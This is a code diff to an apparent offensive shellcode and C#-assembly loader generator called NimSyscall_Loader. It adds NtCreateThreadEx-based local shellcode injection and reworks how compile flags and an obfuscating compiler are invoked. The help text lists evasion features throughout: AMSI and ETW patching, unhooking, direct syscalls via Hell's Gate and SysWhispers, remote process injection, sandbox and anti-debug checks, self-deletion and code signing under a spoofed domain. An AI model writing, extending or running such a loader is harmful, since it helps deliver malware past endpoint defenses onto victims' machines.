@@ -61,7 +61,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -125,6 +125,7 @@ Options:
 [shellcode specific]
 
   --shellcode    Encrypt shellcode to load it on runtime
+  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
       --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
@@ -139,7 +140,7 @@ Options:
 
 [C# assembly Packing]
 
-    --csharp    Encrypt a C# assembly to load it on runtime
+  --csharp    Encrypt a C# assembly to load it on runtime
 
 """
 
@@ -173,6 +174,7 @@ var
     ETW: bool = true
     COMVARETW: bool = false
     shellcode: bool = true
+    localCreateThread: bool = false
     localinject: bool = true
     unhook: bool = false
     denim: bool = false
@@ -229,6 +231,9 @@ if args["--shellcode"]:
   shellcode = true
   csharp = false
   peload = false
+
+if args["--localCreateThread"]:
+    localCreateThread = true
 
 if args["--csharp"]:
   csharp = true
@@ -1183,8 +1188,12 @@ if (peload):
 if (shellcode):
     if (localinject):
         if (getfreshstub):
+            if (localCreateThread):
+                stub.add(NtCreateThreadExDelegate)
             stub.add(LocalInjectDelegates)
         if (hellsgate):
+            if (localCreateThread):
+                stub.add(HellsgateNtCreateThreadExDelegate)
             stub.add(HellsgateAllocDelegate)
         stub.add(LocalInjectStub)
     else:
@@ -1292,6 +1301,7 @@ echo "Written Loader.nim, compiling -> \n\n"
 
 var basicCompileFlags: string = ""
 
+
 if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
     discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
@@ -1322,47 +1332,19 @@ if (llvm):
 elif system.hostOS == "windows":
     # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
     if (denim):
-        basicCompileFlags = "" 
-        #"-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
+        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
     else:
         basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
 if(hellsgate):
-    if(denim):
-        basicCompileFlags.add("-d:Hellsgate")    
-    else:
-        basicCompileFlags.add("-d:Hellsgate ")
+    basicCompileFlags.add("-d:Hellsgate ")
 elif(getfreshstub):
-    if(denim):
-        basicCompileFlags.add("-d:GetSyscallStub")
-    else:
-        basicCompileFlags.add("-d:GetSyscallStub ")
+    basicCompileFlags.add("-d:GetSyscallStub ")
 elif(syswhispers):
-    if(denim):
-        basicCompileFlags.add("-d:SysWhispers")
-    else:
-        basicCompileFlags.add("-d:SysWhispers ")
+    basicCompileFlags.add("-d:SysWhispers ")
 
-
-when system.hostOS == "windows":
-    if (denim):
-        var exist: bool = fileExists("denim.exe")
-        if (exist):
-            stub = stub.replace("import strenc", "")
-            writeFile("Loader.nim", stub)
-            discard os.execShellCmd(fmt"denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
-            let msg = fmt"[!] Encrypted file saved to Loader.exe"
-            echo "\n" & msg
-            if(replace):
-                var randstring: string = rndStr(2)
-                echo fmt"[!] ---> replacing nim with {randstring} "
-                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
-            quit()
-elif system.hostOS == "linux":
-    if (denim):
-        echo "No Denim support for Linux systems, sorry!"
 
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
@@ -1391,6 +1373,9 @@ if (compileX86):
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
 
+if localCreateThread:
+    basicCompileFlags.add("-d:LocalCreateThread ")
+
 if (dll_out):
     if (processname == ""):
         basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
@@ -1410,22 +1395,47 @@ if((syswhispers != true) and (hellsgate != true)):
 
 # for e.g. CNA Scripts
 when system.hostOS == "windows":
-    basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
+    if (denim):
+        basicCompileFlags.add(fmt"-p:""{packerPath}""")
+    else:
+        basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
 else:
     basicCompileFlags.add(fmt"-p:'{packerPath}' ")
 
-if(not denim):
+if(denim == false):
     basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
 
 if debugMode:
-    basicCompileFlags = basicCompileFlags.replace("-d:release", "")
+    basicCompileFlags = basicCompileFlags.replace("-d:debug", "")
     basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
     basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
-
 
 echo "Compile command:"
 echo basicCompileFlags
 echo "\n\n"
+
+when system.hostOS == "windows":
+    if (denim):
+        var exist: bool = fileExists(".\\denim\\denim.exe")
+        # cause some compile problems
+        basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto", "")
+        if (exist):
+            # An additional whitespace at the end causes an compiler error here, so we'll remove it
+            basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
+            stub = stub.replace("import strenc", "")
+            writeFile("Loader.nim", stub)
+            discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
+            let msg = fmt"[!] Encrypted file saved to Loader.exe"
+            echo "\n" & msg
+            if(replace):
+                var randstring: string = rndStr(2)
+                echo fmt"[!] ---> replacing nim with {randstring} "
+                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
+            quit()
+elif system.hostOS == "linux":
+    if (denim):
+        echo "No Denim support for Linux systems, sorry!"
+
 discard os.execShellCmd(basicCompileFlags)
 
 proc replaceList () =
